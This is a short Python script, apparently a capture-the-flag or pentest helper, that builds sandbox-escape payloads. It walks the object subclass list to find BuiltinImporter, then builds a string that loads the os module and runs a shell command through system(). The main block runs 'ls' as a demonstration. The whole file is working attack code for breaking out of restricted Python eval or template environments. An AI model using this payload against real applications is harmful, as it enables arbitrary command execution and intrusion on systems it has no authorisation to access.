class ShellCandidates:
    popen = "subprocess.Popen"
    importer = "BuiltinImporter"


def get_subclasses():
    return '"".__class__.__base__.__subclasses__()'


def find_class(output, cls):
    out = []
    for i, clz in enumerate(output.split(",")):
        if cls in clz:
            out.append((i, clz))
    return out


def system(index, command):
    return get_subclasses() + f"[{index}]().load_module('os').system('{command}')"


if __name__ == '__main__':
    subc = repr(eval(get_subclasses()))
    n = find_class(subc, ShellCandidates.importer)[0][0]
    eval(system(n, "ls"))
